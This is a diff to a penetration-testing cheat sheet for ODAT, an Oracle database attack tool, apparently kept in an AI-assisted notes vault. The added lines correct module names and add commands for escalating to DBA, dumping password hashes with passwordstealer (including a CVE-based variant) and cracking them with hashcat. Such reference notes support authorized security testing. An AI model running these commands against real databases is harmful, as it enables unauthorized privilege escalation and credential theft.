@@ -10,9 +10,11 @@ Oracle Database Attacking Tool — automated Oracle DB exploitation from Linux. 
 # Kali — install via apt
 sudo apt install odat
 
-# Or from source
+# Or from source (default branch is master-python3)
 git clone https://github.com/quentinhardy/odat.git
 cd odat && pip3 install -r requirements.txt
+# List every module: odat -h  (all/sidguesser/passwordguesser/utlfile/externaltable/java/
+#   privesc/passwordstealer/tnscmd/tnspoison/search/unwrapper/stealremotepwds/…)
 ```
 
 ```bash
@@ -76,8 +78,12 @@ odat passwordguesser -s <target-ip> -p 1521 -d <SID> --threads 5
 ## Privilege Check
 
 ```bash
-# Check all privileges for current user
-odat privesc -s <target-ip> -p 1521 -d <SID> -U user -P password --check-privesc
+# List current privileges/roles (--get-privs; there is no --check-privesc)
+odat privesc -s <target-ip> -p 1521 -d <SID> -U user -P password --get-privs
+
+# Auto-escalate to DBA via a grantee-side method (pick one your privs allow):
+odat privesc -s <target-ip> -p 1521 -d <SID> -U user -P password --dba-with-execute-any-procedure
+#   other methods: --dba-with-create-any-trigger, --dba-with-analyze-any, --dba-with-create-any-index
 ```
 
 ---
@@ -148,8 +154,10 @@ odat java -s <target-ip> -p 1521 -d <SID> -U user -P password \
 ## Password Hash Extraction
 
 ```bash
-# Extract Oracle password hashes (requires DBA or SELECT on sys.user$)
-odat hashdump -s <target-ip> -p 1521 -d <SID> -U user -P password --dump
+# Extract Oracle password hashes — module is `passwordstealer` (there is no `odat hashdump`)
+odat passwordstealer -s <target-ip> -p 1521 -d <SID> -U user -P password --get-passwords
+#   variants: --get-all-passwords, --get-passwords-not-locked, --get-passwords-from-history,
+#             --get-passwords-ocm  (indirect, CVE-2020-2984, Oracle 12c+)
 ```
 
 ```bash
@@ -194,6 +202,10 @@ sqlplus scott/tiger@192.168.1.10:1521/ORCL
 
 ---
 
+> [!note] **See also** — once ODAT gets you access, drop into [[Tools/Database/SQLplus|SQL*Plus]] for manual work; service reference [[Services/Database Services/Oracle TNS|Oracle TNS]]. Crack `passwordstealer` output with [[Tools/Auth/hashcat|hashcat]] (`-m 112` 11g / `-m 12300` 12c).
+
+---
+
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-27*
+*Model: claude-opus-5*
